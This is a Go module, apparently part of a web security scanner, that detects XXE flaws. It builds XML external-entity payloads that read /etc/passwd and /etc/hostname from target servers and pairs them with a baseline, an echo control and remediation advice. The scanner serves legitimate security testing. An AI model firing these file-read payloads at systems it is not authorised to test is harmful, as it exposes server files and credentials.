package injection

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/Kur1sulab/kara/engine-go/litmus/scan"
)

// ================================================================ XXE

// xxeBenign 无害基线：结构合法、无 DTD、无实体。
const xxeBenign = `<?xml version="1.0" encoding="UTF-8"?>
<litmus><n>1</n></litmus>`

// xxeEntity 构造带外部实体的文档。uri 必须是 file:// 形式。
func xxeEntity(uri string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
		`<!DOCTYPE litmus [<!ENTITY xxe SYSTEM "` + uri + `">]>` + "\n" +
		`<litmus><n>&xxe;</n></litmus>`
}

// xxeNoEntity 对照：同样的 URI 文本放进注释，但没有 DTD/实体。
// 如果它也能让响应里出现标记，说明服务端只是把请求体回显了，
// 后面的「命中」是回显而不是实体解析。
func xxeNoEntity(uri string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
		`<litmus><!-- ` + uri + ` --><n>1</n></litmus>`
}

// xmlHint 路径上像 XML 接口的端点
func xmlHint(u string) bool {
	lu := strings.ToLower(u)
	for _, s := range []string{".xml", ".wsdl", ".svc", ".soap", ".asmx",
		"/soap", "/xml", "/ws/", "webservice"} {
		if strings.Contains(lu, s) {
			return true
		}
	}
	return false
}

// xxeCandidates 找接受 XML 的端点：
// 先看路径提示，没有再按 Content-Type 实测（最多探 4 个端点，都是 GET）。
func xxeCandidates(p *prober, c *scan.Ctx, o *outcome) []string {
	eps := endpoints(c, 32)
	var hinted []string
	for _, ep := range eps {
		if xmlHint(ep) {
			hinted = append(hinted, ep)
		}
	}
	if len(hinted) > 0 {
		return hinted[:min(3, len(hinted))]
	}
	var typed []string
	for _, ep := range eps {
		if len(typed) >= 3 || p.blockedMsg != "" {
			break
		}
		r := p.fetch(get(ep))
		if !r.ok() {
			continue
		}
		if strings.Contains(strings.ToLower(r.resp.Header("content-type")), "xml") {
			typed = append(typed, ep)
		}
	}
	if len(typed) == 0 {
		o.note(fmt.Sprintf("扫描了 %d 个端点，路径无 .xml/.wsdl 提示、Content-Type 也不是 XML", len(eps)))
	}
	return typed
}

// hostnameRe 一行「像主机名」的文本（XXE 读 /etc/hostname 的产物）
var hostnameRe = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{1,62}$`)

// firstHostnameLine 从响应里挑一行像主机名的文本（排除 XML 结构行与我们的根元素名）
func firstHostnameLine(text, baseline string) string {
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(strings.Trim(line, "\x00"))
		if line == "" || strings.HasPrefix(line, "<") {
			continue
		}
		switch line {
		case "litmus", "1", "n":
			continue
		}
		if !hostnameRe.MatchString(line) {
			continue
		}
		if strings.Contains(baseline, line) {
			continue
		}
		return line
	}
	return ""
}

func runXXE(c *scan.Ctx) scan.Result {
	p, na := prepare(c)
	if na != nil {
		return *na
	}
	o := &outcome{unit: "端点", scope: "只覆盖 XML POST 端点面"}
	cands := xxeCandidates(p, c, o)
	if len(cands) == 0 {
		return scan.Skip("未发现接受 XML 的端点（" + itoa(len(endpoints(c, 32))) +
			" 个落点中既无 .xml/.wsdl 路径，GET 响应 Content-Type 也不是 XML），XXE 无入口")
	}
	o.points = len(cands)
	mk := marker("xxe")
	accepted := 0

	for _, ep := range cands {
		if p.blockedMsg != "" {
			break
		}
		b := p.fetch(postXML(ep, []byte(xxeBenign)))
		if !b.ok() {
			o.fail("XML 基线请求失败 " + ep + "：" + b.errText())
			continue
		}
		if b.status() == 404 || b.status() == 405 || b.status() == 415 || b.status() == 501 {
			o.note(fmt.Sprintf("%s 不接受 application/xml（HTTP %d）", ep, b.status()))
			continue
		}
		accepted++
		o.okPoints++

		uri := "file:///nonexistent/" + mk
		rc := p.fetch(postXML(ep, []byte(xxeNoEntity(uri))))
		if rc.ok() && strings.Contains(rc.text, mk) {
			o.note(ep + " 会把请求体回显到响应，XXE 命中无法与回显区分，该端点不判定")
			continue
		}

		type probe struct {
			uri, label, signal string
		}
		probes := []probe{
			{uri, "外部实体路径回显", "marker"},
			{"file:///etc/passwd", "读取 /etc/passwd", "passwd"},
			{"file:///etc/hostname", "读取 /etc/hostname", "hostname"},
		}
		hit := false
		for _, pr := range probes {
			payload := xxeEntity(pr.uri)
			r := p.fetch(postXML(ep, []byte(payload)))
			if !r.ok() {
				o.fail("XXE payload 请求失败：" + r.errText())
				continue
			}
			conf := "likely"
			detail := ""
			switch pr.signal {
			case "marker":
				if !strings.Contains(r.text, mk) && !strings.Contains(r.headRaw, mk) {
					continue
				}
				conf = "confirmed"
				detail = "响应里出现只有本实体 URI 才有的标记 " + mk +
					"（解析器把 file:// 路径回显了）"
			case "passwd":
				if !strings.Contains(r.text, "root:x:0:0") || strings.Contains(b.text, "root:x:0:0") {
					continue
				}
				conf = "confirmed"
				detail = "响应里出现 /etc/passwd 内容：" + snippetCI(r.text, "root:x:0:0", 60)
			case "hostname":
				line := firstHostnameLine(r.text, b.text)
				if line == "" || !r.differs(b) {
					continue
				}
				detail = "响应里出现 /etc/hostname 内容：" + line
			}
			o.add(newFinding(c, metaXXE, findingOpts{
				sev:   "high",
				level: "L2",
				conf:  conf,
				evidence: fmt.Sprintf("端点: POST %s（Content-Type: application/xml）\n基线: HTTP %d / %dB（无害 XML，无 DTD）\npayload:\n%s\n响应: HTTP %d / %dB\n判定: %s\n回显对照: 去掉 DTD 只留同样的 file:// 文本 → 响应不含标记（已排除请求体回显）",
					ep, b.status(), b.length(), payload, r.status(), r.length(), detail),
				repro:  curlXML(ep, payload),
				impact: "XML 解析器会读取服务端本地文件并随响应返回，可据此读取配置、密钥、源码；若加载外部 DTD 还可进一步 SSRF 或拒绝服务。",
				fix:    "解析 XML 时禁用 DTD 与外部实体（如 DocumentBuilderFactory.setFeature 关闭 disallow-doctype-decl 默认），并禁止外部 schema 解析。",
				extra: map[string]interface{}{
					"path": pathOf(ep), "endpoint": ep, "uri": pr.uri,
					"signal": pr.signal, "payload": payload,
				},
			}))
			hit = true
			break
		}
		if hit {
			continue
		}
	}
	if accepted == 0 {
		// 有端点但都不收 XML：这不是「测了没问题」，是「没有可测的 XML 入口」
		if p.blockedMsg != "" {
			return scan.Skip(p.blockedMsg)
		}
		return scan.Skip(fmt.Sprintf("%d 个候选端点都不接受 application/xml（已请求 %d 次），XXE 没有可测入口",
			len(cands), p.n))
	}
	return o.result(p)
}
